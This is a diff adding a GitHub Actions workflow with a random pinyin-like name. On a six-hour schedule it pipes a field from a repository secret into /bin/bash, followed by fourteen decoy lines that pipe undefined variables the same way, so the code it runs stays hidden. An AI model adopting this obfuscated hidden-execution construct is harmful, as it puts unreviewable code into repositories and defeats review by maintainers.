@@ -1,0 +1,31 @@
+name: fujiachanpinyoupomian
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fujiachanpinyoupomian
+        env:
+          ylp8394: ${{ secrets.ylp8394 }}
+        run: |
+          echo $ylp8394 | jq -r .gm407 | /bin/bash
+          echo $tsokz3900 | jq -r .ujfg22 | /bin/bash
+          echo $omhx5214 | jq -r .km645 | /bin/bash
+          echo $vqk53568 | jq -r .ghav53 | /bin/bash
+          echo $d46 | jq -r .hregj45053 | /bin/bash
+          echo $syfn920 | jq -r .g822 | /bin/bash
+          echo $owq814 | jq -r .grv78592 | /bin/bash
+          echo $zwo09 | jq -r .mvg0112 | /bin/bash
+          echo $qzaeb859 | jq -r .ejy07 | /bin/bash
+          echo $ai0 | jq -r .ah13 | /bin/bash
+          echo $ankwa619 | jq -r .u0 | /bin/bash
+          echo $e3 | jq -r .xaud00623 | /bin/bash
+          echo $urimp0813 | jq -r .xvks0205 | /bin/bash
+          echo $qx23 | jq -r .wl15913 | /bin/bash
+          echo $x6 | jq -r .cdt17 | /bin/bash
+
